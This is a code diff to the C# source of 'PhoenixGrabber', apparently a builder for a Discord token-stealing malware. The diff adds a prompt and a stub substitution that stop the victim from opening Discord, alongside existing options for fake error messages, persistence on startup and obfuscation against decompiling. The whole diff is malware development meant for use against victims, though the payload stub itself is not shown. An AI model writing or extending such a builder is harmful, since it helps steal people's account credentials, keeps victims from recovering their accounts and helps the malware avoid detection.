@@ -21,6 +21,7 @@ namespace PhoenixGrabber
         static bool FakeError = false;
         static string FakeErrorMessage;
         static bool RunOnStartup = false;
+        static bool BlockDiscord = false;
         static bool Obfuscate = false;
         static string FileName;
         #endregion
@@ -65,6 +66,13 @@ namespace PhoenixGrabber
                 RunOnStartup = true;
             }
             Console.Clear();
+            Console.WriteLine("Prevents user from opening Discord in browser/app.\n");
+            Console.Write("Block Discord: (Y/N): ");
+            if (Console.ReadLine().ToLower() == "y")
+            {
+                BlockDiscord = true;
+            }
+            Console.Clear();
             Console.WriteLine("Protects the file from being decompiled.\n");
             Console.Write("Obfuscate: (Y/N): ");
             if (Console.ReadLine().ToLower() == "y")
@@ -95,6 +103,9 @@ namespace PhoenixGrabber
 
             if (RunOnStartup == true)
                 stub = stub.Replace("//RunOnStartup", "RunOnStartup();");
+
+            if (BlockDiscord == true)
+                stub = stub.Replace("//BlockDiscord", "BlockDiscord();");
 
             return stub;
         }
